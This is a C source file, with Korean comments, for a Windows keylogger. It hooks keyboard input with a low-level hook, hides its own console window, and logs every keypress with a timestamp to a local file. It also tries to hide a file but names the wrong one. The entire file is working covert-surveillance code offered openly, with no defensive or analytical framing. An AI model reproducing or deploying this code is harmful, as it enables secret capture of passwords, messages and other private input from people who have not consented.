#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h> 
#include <stdio.h> 
#include <fileapi.h>
HHOOK hHook; 
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { \
	FILE* out;
	
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) { 
		PKBDLLHOOKSTRUCT pKey = (PKBDLLHOOKSTRUCT)lParam; 
		
		//Code가 0보다 클 때에만 처리, 작으면 통과 
		//wParam==WM_KEYDOWN(0x100)은 키보드를 누를 때 
		//wParam==0x10B는 키보드를 땔 때 코드가 실행 
		
		if (nCode >= 0 && (int)wParam == 256) { 
			//lParam포인터(pKey)가 가리키는 곳에서 vkCode(키보드값)를 읽음 
			SYSTEMTIME st; 
			GetLocalTime(&st); 
			out = fopen("KeyLog.txt", "a");
			fprintf(out,"[%02d_%02d_%02d_%02d:%02d:%02d] : ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond); 
			
			if ((GetAsyncKeyState(VK_LCONTROL) & 0x8000) || (GetAsyncKeyState(VK_RCONTROL) & 0x8000)) { 
				fprintf(out, "[Ctrl] + "); 
			} 
			else if ((GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000)) {
				fprintf(out, "[Shift] + ");
			} 
			else if (VK_BACK == pKey->vkCode) { 
				fprintf(out, "[Backspace] \n");
			} 
			
			if (VK_LSHIFT == pKey->vkCode || VK_RSHIFT == pKey->vkCode) { 
				fprintf(out, "[Shift] \n");
			}
			else if (VK_LCONTROL == pKey->vkCode || VK_RCONTROL == pKey->vkCode) { 
				fprintf(out, "[Ctrl] \n");
			} 
			else if (VK_RETURN == pKey->vkCode) { 
				fprintf(out, "[Enter] \n");
			} 
			else if (VK_SPACE == pKey->vkCode) { 
				fprintf(out, "[Space] \n");
			} 
			else { 
				fprintf(out, "%c \n", pKey->vkCode);
			} 
			fclose(out);
			SetFileAttributesA("test.txt", FILE_ATTRIBUTE_HIDDEN);
		}
	} 
	CallNextHookEx(hHook, nCode, wParam, lParam); 
	//후킹이 끝나고 원래 작업을 하기위해서 사용한다고 생각 
	return 0; 
} 

void SetHook() { 
	HMODULE hInstance = GetModuleHandle(NULL);
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, NULL); 
}

void UnHook() { 
	UnhookWindowsHookEx(hHook); 
} 

int main() { 
	HWND hWnd = GetForegroundWindow();
	ShowWindow(hWnd, SW_HIDE);
	printf("[Key_Logger] >>> Start\n"); 
	SetHook(); 
	MSG msg;
	GetMessage(&msg, NULL, NULL, NULL); 
	//메세지큐에서 메세지를 읽음 
	//메세지가 WM_QUIT일 경우 프로그램을 종료하라는 의미이므로 False를 반환 
	//오지랖 : while문과 함께 사용 시 프로그램종료 시까지 메세지큐에 있는 메세지를 읽을 수 있음
	UnHook(); 

}
